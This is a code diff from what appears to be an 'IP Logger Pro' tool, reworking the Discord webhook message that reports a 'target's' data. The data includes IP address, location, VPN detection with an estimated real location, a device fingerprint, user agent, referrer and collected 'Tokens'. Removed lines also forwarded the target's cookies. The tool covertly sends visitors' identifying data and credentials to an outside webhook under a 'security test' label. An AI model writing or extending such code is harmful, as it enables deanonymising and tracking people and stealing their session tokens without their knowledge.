@@ -229,23 +229,45 @@ async function sendToWebhook(webhookUrl: string, data: any): Promise<void> {
     const isVpnDetected = data.isVpn === 'yes';
     const webhookData = {
       embeds: [{
-        title: isVpnDetected ? "🚨 VPN DETECTED - Security Alert" : "🎯 Security Test Alert",
-        color: isVpnDetected ? 0xff8800 : 0x00ff00,
+        title: isVpnDetected ? "🚨 VPN DETECTED - Enhanced Security Alert" : "🎯 IP Logger Security Test",
+        description: isVpnDetected ? 
+          "⚠️ **VPN or Proxy detected!** Target is masking their real IP address." :
+          "✅ Direct connection detected. Target is using their real IP address.",
+        color: isVpnDetected ? 0xFF4444 : 0x00AA00,
         fields: [
-          { name: "🌐 IP Address", value: data.ipAddress, inline: true },
-          { name: "📍 Location", value: data.location || "Unknown", inline: true },
-          { name: "🛡️ VPN Status", value: isVpnDetected ? `🚨 VPN DETECTED\nVPN: ${data.vpnLocation}\nReal: ${data.realLocation}` : "✅ Direct Connection", inline: false },
-          { name: "📱 Device Type", value: data.deviceType || "Unknown", inline: true },
-          { name: "🌐 Browser", value: data.browserName || "Unknown", inline: true },
-          { name: "💻 OS", value: data.operatingSystem || "Unknown", inline: true },
-          { name: "🏷️ Brand", value: data.deviceBrand || "Unknown", inline: true },
-          { name: "🔍 User Agent", value: data.userAgent ? data.userAgent.substring(0, 150) + (data.userAgent.length > 150 ? "..." : "") : "Unknown", inline: false },
-          { name: "🔗 Referrer", value: data.referrer || "Direct Access", inline: true },
-          { name: "🍪 Cookies", value: data.cookies ? data.cookies.substring(0, 500) + (data.cookies.length > 500 ? "..." : "") : "None", inline: false },
-          { name: "🔑 Tokens Found", value: data.tokens || "None", inline: true },
-          { name: "⏰ Timestamp", value: new Date().toISOString(), inline: true }
+          { 
+            name: "🌐 **IP Intelligence**", 
+            value: `**Address:** \`${data.ipAddress}\`\n**Location:** ${data.location || "Unknown"}${isVpnDetected ? `\n**🔍 Detection Score:** High` : ''}`, 
+            inline: false 
+          },
+          ...(isVpnDetected ? [{
+            name: "🛡️ **VPN Analysis**", 
+            value: `**VPN Location:** ${data.vpnLocation || "Unknown"}\n**Estimated Real Location:** ${data.realLocation || "Unknown"}\n**Risk Level:** 🔴 High`, 
+            inline: false 
+          }] : []),
+          { 
+            name: "📱 **Device Fingerprint**", 
+            value: `**Type:** ${data.deviceType || "Unknown"}\n**Browser:** ${data.browserName || "Unknown"}\n**OS:** ${data.operatingSystem || "Unknown"}\n**Brand:** ${data.deviceBrand || "Unknown"}`, 
+            inline: true 
+          },
+          { 
+            name: "🔍 **Session Details**", 
+            value: `**Referrer:** ${data.referrer || "Direct Access"}\n**Tokens:** ${data.tokens || "None"}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
+            inline: true 
+          },
+          { 
+            name: "🌐 **User Agent**", 
+            value: `\`\`\`${data.userAgent ? data.userAgent.substring(0, 200) + (data.userAgent.length > 200 ? "..." : "") : "Unknown"}\`\`\``, 
+            inline: false 
+          }
         ],
-        footer: { text: isVpnDetected ? "⚠️ VPN DETECTED - Enhanced Security Alert" : "✅ Security Testing Tool" }
+        footer: { 
+          text: isVpnDetected ? 
+            "🔐 IP Logger Pro - VPN Detection Active" : 
+            "🎯 IP Logger Pro - Tracking Active",
+          icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
+        },
+        timestamp: new Date().toISOString()
       }]
     };
 
